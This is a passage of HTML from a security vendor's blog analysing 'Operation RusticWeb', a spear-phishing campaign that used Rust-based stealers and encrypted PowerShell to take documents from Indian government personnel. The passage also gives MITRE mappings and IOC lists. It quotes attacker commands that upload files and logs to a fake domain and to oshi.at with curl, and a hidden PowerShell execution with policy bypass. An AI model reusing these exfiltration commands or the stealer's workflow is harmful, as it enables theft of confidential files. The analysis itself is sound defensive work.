https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig9.png 740w\" sizes=\"(max-width: 470px) 100vw, 470px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 9 – System check logs</i></p>\n<p>These logs are written into a file named ‘<i>MySystem.txt</i>’ in <i>ProgramData\\syscheck </i>directory and uploaded to the same domain as:</p>\n<p><span style=\"text-decoration: underline\">“curl -F TT=@C:\\ProgramData\\syscheck\\MySystem.txt hxxps://awesscholarship[.in/upload/upload.php” </span></p>\n<p><img class=\"alignnone wp-image-5979 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig10-300x92.png\" alt=\"\" width=\"495\" height=\"152\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig10-300x92.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig10.png 557w\" sizes=\"(max-width: 495px) 100vw, 495px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 10 – URL to download the next stage</i></p>\n<p>Then another archive named <i>file1.zip</i> is downloaded from the same fake domain and extracted. It is renamed to ‘<i>MySystem.exe</i>’ and executed. Lastly, <b><i>persistence</i></b> for this final payload is created through the Startup directory.</p>\n<p><img class=\"alignnone wp-image-5980 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig11-300x115.png\" alt=\"\" width=\"672\" height=\"257\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig11-300x115.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig11-768x295.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig11.png 906w\" sizes=\"(max-width: 672px) 100vw, 672px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 11 – Persistence via Startup</i></p>\n<h3><b>Stealer: Final Stage</b></h3>\n<p>The final payload is another rust-based malware that steals files, collects system name &amp; IP, and uploads individual files along with the logs. It doesn’t have built-in features of sophisticated info-stealers like stealing from web browsers, Discord/Steam or cryptocurrency wallets. Multiple versions of this stealer were found in this campaign with compilation timestamps ranging from September till date (December) and they have had a significantly lower detection rate on Virus Total.</p>\n<table>\n<tbody>\n<tr>\n<td><b>MD5</b></td>\n<td><b>Compilation Timestamp</b></td>\n<td><b>PDB</b></td>\n</tr>\n<tr>\n<td>da745b60b5ef5b4881c6bc4b7a48d784</td>\n<td>2023-09-26</td>\n<td>syscheck.pdb</td>\n</tr>\n<tr>\n<td>f68b17f1261aaa4460d759d95124fbd4</td>\n<td>2023-09-26</td>\n<td>alam.pdb</td>\n</tr>\n<tr>\n<td>237961bbba6d4aa2e0fae720d4ece439</td>\n<td>2023-10-26</td>\n<td>alam.pdb</td>\n</tr>\n<tr>\n<td>d2949a3c4496cb2b4d204b75e24390d9</td>\n<td>2023-12-08</td>\n<td>Zew.pdb</td>\n</tr>\n<tr>\n<td>fc61b985d8c590860f397d943131bfb5</td>\n<td>2023-12-11</td>\n<td>Zew.pdb</td>\n</tr>\n</tbody>\n</table>\n<p>Changes in PDB path name can be seen in October and December samples but the similarity is almost identical when compared via BinDiff, which is 91%, except for few minor changes.</p>\n<p><img class=\"alignnone wp-image-5981 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig12-300x127.png\" alt=\"\" width=\"681\" height=\"288\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig12-300x127.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig12-768x326.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig12-1024x435.png 1024w\" sizes=\"(max-width: 681px) 100vw, 681px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 12 – Similarity in samples</i></p>\n<p>It enumerates all document and archive files in all the drives it fetched previously in the downloader stage. Two log files are created inside a new folder with different names (<i>Micro, File</i>) for each sample under the <i>ProgramData</i> directory. They are used to store records of uploaded files and logs of enumerated files. After saving enumerated files to ‘<i>Logs.txt,</i>’ each file is uploaded via the <i>curl</i> PUT method to <b><i>oshi[.]at</i></b> domain, an anonymous public file-sharing engine called <a href=\"https://github.com/somenonymous/OshiUpload\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">OshiUpload</a>.</p>\n<p><span style=\"text-decoration: underline\">“curl -T C:\\Users\\test\\Downloads\\&lt;filename&gt;.zip hxxps://oshi[.]at” </span></p>\n<p>Along with the desktop name, the links to download these files are saved in ‘<i>Records.txt,</i>’ which contains three URLs for each file. Two are Clearnet links – one for managing and the other for downloading. The third is a Tor domain of Oshi to download via hidden service.</p>\n<p><img class=\"alignnone wp-image-5982 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig13-300x92.png\" alt=\"\" width=\"604\" height=\"185\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig13-300x92.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig13-768x234.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig13.png 904w\" sizes=\"(max-width: 604px) 100vw, 604px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 13 – Download links of uploaded files</i></p>\n<p>The management page displays the attributes of the file uploaded – download links, size, type, hash, and timestamp. Options for destroying the file along with an expiration timer are present.</p>\n<p><img class=\"alignnone wp-image-5983 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig14-300x125.png\" alt=\"\" width=\"599\" height=\"250\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig14-300x125.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig14-768x321.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig14-1024x428.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig14.png 1127w\" sizes=\"(max-width: 599px) 100vw, 599px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 14 – Management page for uploaded files</i></p>\n<p>The log files with timestamps in the filename are uploaded to the fake AWES domain. The server response is verified for a successful upload, after which it goes into an infinite sleep until interrupted.</p>\n<p><img class=\"alignnone wp-image-5984 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig15-300x129.png\" alt=\"\" width=\"713\" height=\"307\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig15-300x129.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig15-768x331.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig15-1024x441.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig15.png 1156w\" sizes=\"(max-width: 713px) 100vw, 713px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 15 – Server response after uploading logs</i></p>\n<p>With the new stealer payloads that we observed in December, the threat actor utilizes a new bait document that belongs to Kailash Satyarthi Children’s Foundation. The document is available on their <a href=\"https://satyarthi.org.in/wp-content/uploads/2022/09/Assam.pdf\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">website</a>, which is related to their statistics report on “Child Marriage and other crimes against Children in Assam”.</p>\n<p><img class=\"alignnone wp-image-5985 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig16-212x300.png\" alt=\"\" width=\"384\" height=\"544\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig16-212x300.png 212w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig16-768x1086.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig16-724x1024.png 724w\" sizes=\"(max-width: 384px) 100vw, 384px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 16 – Decoy: Assam CDR (Dec’23)</i></p>\n<p>Using decoys themed as children&#8217;s foundations or societies for army children and IAS officers in a spear-phishing campaign indicates a targeted effort aimed at Indian government officials, especially those associated with children&#8217;s foundations or societies.</p>\n<h2><b>Infection Chain 2</b></h2>\n<p>Another similar infection chain was observed in December using maldocs, where enumeration and exfiltration were done using PowerShell script instead of Rust-based payloads. Along with two fake domains, encrypted PowerShell scripts have been used here.</p>\n<p><img class=\"alignnone wp-image-5986 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig17-300x244.png\" alt=\"\" width=\"542\" height=\"441\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig17-300x244.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig17-768x626.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig17.png 992w\" sizes=\"(max-width: 542px) 100vw, 542px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 17 – Infection Chain (2)</i></p>\n<p>The infection starts with a phishing maldoc that contains malicious VBA macro. With basic VBA obfuscation, it contains encrypted PowerShell commands. Similar maldocs have been identified that use slightly modified PS commands.</p>\n<ol>\n<li>Dsop_Nom.ppam</li>\n<li>DSOP-NOM.ppam</li>\n<li>PM_INDIG_INITIATIVE_BRIEF.ppam</li>\n</ol>\n<p><img class=\"alignnone wp-image-5987 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig18-300x253.png\" alt=\"\" width=\"585\" height=\"493\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig18-300x253.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig18-768x647.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig18.png 854w\" sizes=\"(max-width: 585px) 100vw, 585px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 18 – Malicious VBA macro</i></p>\n<h3><b>Encrypted PowerShell</b></h3>\n<p>Once the document is opened, it converts the numbers to characters forming ‘<i>PoWeRSHEll</i>’. The PowerShell command contains encrypted data, which is converted to a SecureString using ‘<i>ConvertTo-SecureString</i>&#8216; with a key. This follows a similar way of PowerShell decryption seen in <a href=\"https://www.malwarebytes.com/blog/news/2018/06/malware-analysis-decoding-emotet-part-2\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Emotet</a> but with slightly additional obfuscation.</p>\n<p><img class=\"alignnone wp-image-5988 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig19-300x146.png\" alt=\"\" width=\"843\" height=\"410\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig19-300x146.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig19-768x375.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig19-330x160.png 330w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig19.png 1348w\" sizes=\"(max-width: 843px) 100vw, 843px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 19 – Encrypted and Obfuscated PowerShell commands</i></p>\n<p>In the first maldoc, the converted string uses the <i>Marshal</i> object for memory managing the decryption via built-in DPAPI to invoke the commands using <i>SecureStringToGlobalAllocUnicode</i> method. The second one uses the <i>PSCredentials</i> object to get a plain-text string. In the final one, <i>PtrToStringBSTR</i> and <i>SecureStringToBSTR</i> are used with the <i>Marshal</i> object. For obfuscation, the commands use techniques from <a href=\"https://github.com/danielbohannon/Invoke-Obfuscation/tree/master\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Invoke-Obfuscation</a> to mask the trigger of the IEX command using environment variables:</p>\n<p><img class=\"alignnone wp-image-5989 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig20-300x228.png\" alt=\"\" width=\"354\" height=\"269\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig20-300x228.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig20.png 461w\" sizes=\"(max-width: 354px) 100vw, 354px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 20 – Obfuscated IEX command</i></p>\n<p>Looking at the wholly decrypted PowerShell commands, it downloads the decoy file and the next-stage PowerShell script. They are downloaded from the domains into the <i>Downloads</i> and <i>Documents</i> directories and executed.</p>\n<p><img class=\"alignnone wp-image-5990 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig21-300x98.png\" alt=\"\" width=\"456\" height=\"149\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig21-300x98.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig21.png 659w\" sizes=\"(max-width: 456px) 100vw, 456px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 21 – Decoded commands (1)</i></p>\n<p> <img class=\"alignnone wp-image-5991 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig22-300x100.png\" alt=\"\" width=\"456\" height=\"152\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig22-300x100.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig22.png 657w\" sizes=\"(max-width: 456px) 100vw, 456px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 22 – Decoded commands (2)</i></p>\n<h3><b>Domains and Decoys</b></h3>\n<p>The first scenario downloads from the domain ‘<b><i>parichay.epar[.]in</i></b><i>,</i>’ whereas the second one uses the same fake domain of AWES observed in the first infection chain. This is another fake domain used to host malicious payloads, which mimics the official government website ‘<b><i>parichay.nic[.]in</i></b>’. It is a Government SSO platform designed to onboard the users under a single authentication framework. While Parichay authorizes government employees to access various NIC services based on “user department” and the Government eMail address (@nic.in/@gov.in), Jan Parichay authorizes citizens to access citizen-centric services.</p>\n<p><img class=\"alignnone wp-image-5992 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig23-300x158.png\" alt=\"\" width=\"712\" height=\"375\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig23-300x158.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig23-768x405.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig23-1024x539.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig23.png 1365w\" sizes=\"(max-width: 712px) 100vw, 712px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 23 – Legitimate and fake Parichay domains</i></p>\n<p>The first decoy pertains to the DSOP (Defence Services Officers Provident) Fund nomination form, which deals with the Defence Accounts Department. The second decoy is related to a presentation on a quarterly brief with the Ministry of Defence.</p>\n<p><img class=\"alignnone wp-image-5993 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig24-216x300.png\" alt=\"\" width=\"383\" height=\"532\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig24-216x300.png 216w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig24.png 669w\" sizes=\"(max-width: 383px) 100vw, 383px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 24 – Decoy: Defence Services Officers Provident (DSOP) Fund</i></p>\n<p style=\"text-align: left\"><img class=\" wp-image-5994 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig25-296x300.png\" alt=\"\" width=\"378\" height=\"383\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig25-296x300.png 296w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig25-55x55.png 55w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig25-45x45.png 45w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig25.png 621w\" sizes=\"(max-width: 378px) 100vw, 378px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 25 – Decoy: Ministry of Defence</i></p>\n<p>The next-stage PowerShell script ‘<i>Mail_check.ps1</i>’ dropped is encrypted and obfuscated similarly. Looking at the decrypted script, it starts by downloading and extracting an archive file, which contains a payload named ‘<i>syscheck.exe.</i>’ It is extracted directly to the Startup folder to establish persistence for this payload.</p>\n<p><img class=\"alignnone wp-image-5995 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig26-300x48.png\" alt=\"\" width=\"707\" height=\"113\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig26-300x48.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig26-768x123.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig26.png 929w\" sizes=\"(max-width: 707px) 100vw, 707px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 26 – Dropped PowerShell script after decryption</i></p>\n<h3><b>Enumerate and Exfiltrate</b></h3>\n<p>The binary is another Rust-based payload with a different PDB name, <i>‘Aplet.pdb.’</i> It has a compiler timestamp of Dec 14 and has the name of Cisco’s <b><i>AnyConnect Web Helper</i></b> with a signed certificate.</p>\n<p><img class=\"alignnone wp-image-5996 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig27-300x262.png\" alt=\"\" width=\"408\" height=\"356\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig27-300x262.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig27.png 482w\" sizes=\"(max-width: 408px) 100vw, 408px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 27 – Binary with WebHelper Certificate</i></p>\n<p>Instead of performing the enumeration &amp; exfiltration directly, this drops a PowerShell script ‘<i>sys.ps1</i>’ into the <i>Pictures</i> directory for this purpose after fetching the username. The command triggered is:</p>\n<p><span style=\"text-decoration: underline\">&#8220;powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\test\\Pictures\\sys.ps1”</span></p>\n<p>It excludes 3 folders during enumeration: <i>Windows</i> and both the ‘<i>Program Files</i>’ directories. Only 13 filetypes are shortlisted: (&#8216;.ppt&#8217;, &#8216;.pptx&#8217;, &#8216;.pdf&#8217;, &#8216;.xlsx&#8217;, &#8216;.xlsm&#8217;, &#8216;.xls&#8217;, &#8216;.xlam&#8217;, &#8216;.doc&#8217;, &#8216;.docx&#8217;, &#8216;.docm&#8217;, &#8216;.txt&#8217;, &#8216;.dot&#8217;, &#8216;.ppam&#8217;) and each file is logged to ‘<i>paths.txt</i>’ in <i>Documents</i> folder.</p>\n<p><img class=\"alignnone wp-image-5997 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig28-300x246.png\" alt=\"\" width=\"602\" height=\"493\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig28-300x246.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig28.png 985w\" sizes=\"(max-width: 602px) 100vw, 602px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 28 – Enumeration &amp; Exfiltration</i></p>\n<p>Once it is uploaded to <i>oshi[.]at</i>, the download URLs are saved to ‘<i>suc_logs.txt</i>’ similar to campaign 1. This script runs in an infinite loop to check if any new files have been created. These URL logs are periodically uploaded after a specific duration.</p>\n<p><img class=\"alignnone wp-image-5998 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig29-300x256.png\" alt=\"\" width=\"600\" height=\"512\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig29-300x256.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig29-768x656.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig29.png 889w\" sizes=\"(max-width: 600px) 100vw, 600px\" /></p>\n<p style=\"text-align: center\"> <i>Fig. 29 – Uploading logs</i></p>\n<p>Meanwhile, the parent binary (<i>syscheck</i>) goes into infinite sleep unless interrupted. If so, instead of exiting, it uploads the URL logs to Oshi again. Additionally, it also uploads to a sub-domain of firebaseio as a backup measure this time.</p>\n<p><img class=\"alignnone wp-image-5999 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig30-300x126.png\" alt=\"\" width=\"753\" height=\"316\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig30-300x126.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig30-768x322.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig30-1024x429.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig30.png 1065w\" sizes=\"(max-width: 753px) 100vw, 753px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 30 – Uploading to Firebaseio with authentication</i></p>\n<p>The Firebase Realtime Database is a cloud-hosted NoSQL database that can store and sync data in real-time. It is an open platform by Google that is widely used for cloud-based applications by developers and has attracted threat actors to deploy malware like <a href=\"https://www.welivesecurity.com/en/eset-research/unlucky-kamran-android-malware-spying-urdu-speaking-residents-gilgit-baltistan/\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Unlucky Kamran</a> to exfiltrate data. It provides several features like cloud storage, hosting, real-time database, and more.</p>\n<h2><b>Conclusion</b></h2>\n<p>A new phishing campaign is targeting various Indian government personnel to steal confidential documents. Rust-based payloads and encrypted PowerShell scripts have been deployed to enumerate and exfiltrate documents to an anonymous public file-sharing engine called <i>OshiUpload</i> instead of a dedicated command-and-control (C2) server. Both fake domains that mimic government entities have been used to host malicious payloads in this cyber-espionage attack. Operation RusticWeb could be linked to an APT threat as it shares similarities with various Pakistan-linked groups. As threat actors shift to malware developed using newly compiled languages like Golang, Rust, and Nim, we recommend proceeding with caution and taking necessary precautions to stay protected.</p>\n<h2><b>SEQRITE Protection</b></h2>\n<ul>\n<li>Lnk.Stealer.48397</li>\n<li>PS.Stealer.48398</li>\n<li>RustStealer.48408.GC</li>\n<li>Script.RustStealer.48409</li>\n<li>Trojan.Ruststealer</li>\n</ul>\n<h2><b>MITRE ATT&amp;CK</b></h2>\n<table>\n<tbody>\n<tr>\n<td><b>Tactic</b></td>\n<td><b>Technique ID</b></td>\n<td><b>Name</b></td>\n</tr>\n<tr>\n<td>Resource Development</td>\n<td>T1583.001</p>\n<p>T1587.001</p>\n<p>T1588.002</p>\n<p>T1608.001</p>\n<p>T1608.005</td>\n<td>Acquire Infrastructure: Domains</p>\n<p>Develop Capabilities: Malware</p>\n<p>Obtain Capabilities: Tool</p>\n<p>Stage Capabilities: Upload Malware</p>\n<p>Stage Capabilities: Link Target</td>\n</tr>\n<tr>\n<td>Initial Access</td>\n<td>T1566.002</td>\n<td>Phishing: Spear phishing Link</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>T1106</p>\n<p>T1129</p>\n<p>T1059</p>\n<p>T1047</p>\n<p>T1204.002</td>\n<td>Native API</p>\n<p>Shared Modules</p>\n<p>Command and Scripting Interpreter</p>\n<p>Windows Management Instrumentation</p>\n<p>User Execution: Malicious File</td>\n</tr>\n<tr>\n<td>Persistence</td>\n<td>T1547.001</td>\n<td>Registry Run Keys / Startup Folder</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>T1027.010</p>\n<p>T1036.007</p>\n<p>T1140</td>\n<td>Command Obfuscation</p>\n<p>Masquerading: Double File Extension</p>\n<p>Deobfuscate/Decode Files or Information</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>T1016</p>\n<p>T1033</p>\n<p>T1083</td>\n<td>System Network Configuration Discovery</p>\n<p>System Owner/User Discovery</p>\n<p>File and Directory Discovery</td>\n</tr>\n<tr>\n<td>Collection</td>\n<td>T1005</p>\n<p>T1119</td>\n<td>Data from Local System</p>\n<p>Automated Collection</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>T1105</td>\n<td>Ingress Tool Transfer</td>\n</tr>\n<tr>\n<td>Exfiltration</td>\n<td>T1020</p>\n<p>T1567</td>\n<td>Automated Exfiltration</p>\n<p>Exfiltration Over Web Service</td>\n</tr>\n</tbody>\n</table>\n<h2><b>IOCs</b></h2>\n<table>\n<tbody>\n<tr>\n<td><b>MD5</b></td>\n<td><b>Filename</b></td>\n</tr>\n<tr>\n<td>56cb95b63162d0dfceb30100ded1131a</td>\n<td>IPR_2023-24.pdf.zip</td>\n</tr>\n<tr>\n<td>13ee4bd10f05ee0499e18de68b3ea4d5</td>\n<td>IPR_2023-24.pdf.lnk</td>\n</tr>\n<tr>\n<td>de30abf093bd4dfe6b660079751951c6</td>\n<td>DSOP-NOM.ppam</td>\n</tr>\n<tr>\n<td><b>PowerShell</b></td>\n<td></td>\n</tr>\n<tr>\n<td>c9969ece7bb47efac4b3b04cdc1538e5</td>\n<td>in.ps1</td>\n</tr>\n<tr>\n<td>f14e778f4d22df275c817ac3014873dc</td>\n<td>In.ps1</td>\n</tr>\n<tr>\n<td>501a6d48fd8f80a134cf71db3804cf95</td>\n<td>Mail_check.ps1</td>\n</tr>\n<tr>\n<td>6d29fc0a73096433ff9449c4bbc4cccc</td>\n<td>sys.ps1</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Decoys</b></td>\n</tr>\n<tr>\n<td>a9182c812c7f7d3e505677a57c8a353b</td>\n<td>Ipr.pdf</td>\n</tr>\n<tr>\n<td>f5d8664cbf4a9e154d4a888e4384cb1d</td>\n<td>abc009.pdf</td>\n</tr>\n<tr>\n<td>3ce8dfb3f1bff805cb6b85a9e950b3a2</td>\n<td>1.pdf</td>\n</tr>\n<tr>\n<td>a696c50dd5d15ba75c9e7f8d3c64997c</td>\n<td>1.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Archive</b></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">e0102071722a87f119b12434ae651b48</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">ee8d767069faf558886f1163a92e4009</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">9f3359ae571c247a8be28c0684678304</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">b0b6629d35451bcc511c0f2845934c3e</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">f2501e8b57486c427579eeda20b729fd</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">20b4eb5787faa00474f7d27c0fea1e4b</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">635864ff270cf8e366a7747fb5996766</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>EXE</b></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">da745b60b5ef5b4881c6bc4b7a48d784</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">f68b17f1261aaa4460d759d95124fbd4</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">237961bbba6d4aa2e0fae720d4ece439</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">d2949a3c4496cb2b4d204b75e24390d9</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">fc61b985d8c590860f397d943131bfb5</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">04557782d7017f18ec059fc96d7f2dc8</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Domain/IP</b></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">awesscholarship[.]in<br />\n<span style=\"font-family: inherit;font-size: inherit\">89.117.188[.]126</span><span style=\"font-family: inherit;font-size: inherit\"> </span></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">parichay.epar[.]in<br />\n<span style=\"font-family: inherit;font-size: inherit\">13.232.102[.]189</span><span style=\"font-family: inherit;font-size: inherit\"> </span></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">oshi[.]at</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">alfa-aeafa-default-rtdb.firebaseio[.]com</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>URLs</b></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://rb[.]gy/gbfsi</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/file.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/file1.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/in.ps1</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/upload.php</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/Ipr.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/abc009.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/1.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/upload/DSOP-NOM.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/ppam/Mail_Check.ps1</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://awesscholarship[.]in/ppam/syscheck.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://parichay.epar[.]in/Win/1.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">hxxps://parichay.epar[.]in/Win/Mail_Check.ps1</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>PDB</b></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\Users\\123\\Desktop\\Syscheck\\target\\release\\deps\\syscheck.pdb</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\Users\\123\\Desktop\\Alam\\target\\release\\deps\\alam.pdb</td>\n</tr>\n<tr>\n<td colspan=\"2\" 